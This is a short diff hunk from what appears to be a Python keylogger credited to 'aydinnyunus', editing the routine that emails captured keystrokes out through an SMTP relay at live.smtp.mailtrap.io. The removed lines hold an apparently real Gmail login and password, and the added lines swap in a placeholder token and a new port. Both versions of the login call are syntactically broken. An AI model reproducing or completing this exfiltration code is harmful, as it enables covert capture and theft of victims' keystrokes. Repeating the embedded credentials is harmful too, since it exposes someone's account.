@@ -72,8 +72,8 @@ finally:
             Keylogger by aydinnyunus\n"""
 
             m += message
-            with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
-                server.login(rj3372407@gmail.com,9DFF14b0d025@@)
+            with smtplib.SMTP("live.smtp.mailtrap.io", 2525) as server:
+                server.login(smtp@mailtrap.io;YOUR_API_TOKEN)
                 server.sendmail(sender, receiver, message)
 
         def report(self):
